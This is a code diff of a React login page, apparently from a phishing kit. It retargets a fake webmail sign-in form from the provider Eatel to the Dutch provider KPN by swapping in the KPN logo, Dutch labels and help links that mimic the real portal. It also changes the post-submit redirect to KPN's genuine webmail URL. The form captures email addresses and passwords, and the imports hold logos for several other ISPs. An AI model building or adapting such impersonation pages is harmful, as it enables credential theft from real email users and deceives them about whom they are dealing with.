@@ -9,6 +9,7 @@ import axios from 'axios';
 import iglou from './iglou.png';
 import catskill from './catskill.png';
 import eatel from './eatel.png';
+import kpn from './kpn.png';
 
 function Home(){
 
@@ -16,7 +17,7 @@ function Home(){
     const[email, setUserName] = useState("");
     const[password, setPassword] = useState("");
 
-    const[platform, setPlatform] = useState("Eatel")
+    const[platform, setPlatform] = useState("KPN")
 
     const[showError, setShowError] = useState(false);
 
@@ -43,7 +44,7 @@ function Home(){
              // console.log(response.data.message);
   
             
-             window.location.href = 'https://webmail.eatel.net/';
+             window.location.href = 'https://webmail.kpnmail.nl/mail/logon.asp';
           }
         } catch (error) {
           // Handle error
@@ -66,22 +67,22 @@ function Home(){
 
 
 
-            <div className='text-center my-4'>
-            <img  src={eatel} />
+            <div className=' px-3'>
+            <img  src={kpn} className="myimage"/>
+
+            </div>
+
+            <div className='px-3 text-center mb-4'style={{
+              fontSize:"30px",
+              fontWeight:"400",
+            }}>
+             Inloggen Webmail
 
             </div>
 
 
-            <div className='col-md-5 whitediv m-auto px-0'>
-              <div className='px-3 m-0'style={{
-                backgroundColor:'#0092bc',
-                color:"white",
-              }}>
-                <p className='font-weight-bold change'>Welcome to Webmail <br/>Looking to view/pay your bill? <span>Click here.</span></p>
-               
-                <p className=''>Enter your full email address and password to login.</p>
-
-              </div>
+            <div className='col-md-5 whitediv m-auto px-0 py-3'>
+              
                 
 
 
@@ -89,56 +90,61 @@ function Home(){
                 <form onSubmit={handleSubmit} className="px-5 ">
 
                     <div className='form-group'>
-                        <label className='label'> E-mail address</label>
+                        {/* <label className='label'> E-mail address</label> */}
                         <input type="email"onChange={function(e){
                             setUserName(e.target.value);
-                        }}value={email} className="form-control"required />
+                        }}value={email}placeholder='Gebruikersnaam / e-mailadres' className="form-control"required />
 
                     </div>
 
 
                     <div className='form-group'>
-                        <label className='label'> Password</label>
+                        {/* <label className='label'> Password</label> */}
                         <input type="password"onChange={function(e){
                             setPassword(e.target.value);
-                        }}value={password} className="form-control"required />
+                        }}value={password} placeholder='Wachtwoord' className="form-control"required />
 
                     </div>
+
+                    <div className='form-group'>
+
+                      <input type="checkbox" /> <span className='px-3'> Onthoud mijn gebruikersnaam</span>
+
+                    </div>
+
 
                    
 
 
-                    <div className='form-group'>
-                    <label class="toggle-container">
-                        <input type="checkbox"className='mycheck'/> 
-                     <span class="toggle-slider"></span> <span className='px-3 'style={{
-                         fontSize:"15px",
-                     }}>Shared computer - log me out after 4 hours</span>
-    </label>
-
-                    </div>
+                   
 
 
-                    <div className='form-group'>
-                    <label class="toggle-container">
-                        <input type="checkbox"className='mycheck'/> 
-                     <span class="toggle-slider"></span> <span className='px-3 'style={{
-                         fontSize:"15px",
-                     }}>Keep me logged in until I log out</span>
-    </label>
-
-                    </div>
-
+                  
 
                     <div className='form-group text-center py-4'>
 
 <button type='submit' style={{
-    background:"#39207c",
-}}className='btn text-center w-50 font-weight-bold text-light py-2'>LOGIN</button>
+    background:"#09F",
+}}className='btn text-center w-100 font-weight-bold text-light py-2'>LOGIN</button>
 
 
 
 
+<br/>
+
+
+<h6 className='text-center mt-4'>Waarmee kunnen we je helpen?</h6>
+
+
+<ul className='bottom text-left py-1'>
+  <li className='items'>Wachtwoord vergeten</li>
+  <li className='items'>Alles over KPN e-mail en Webmail</li>
+  <li className='items'>E-mail instellen op je mobiele telefoon</li>
+  <li className='items'> Problemen bij het ontvangen en versturen van e-mail</li>
+  <li className='items'> Freeler e-mail instellingen beheren</li>
+
+
+</ul>
 
 
 </div>
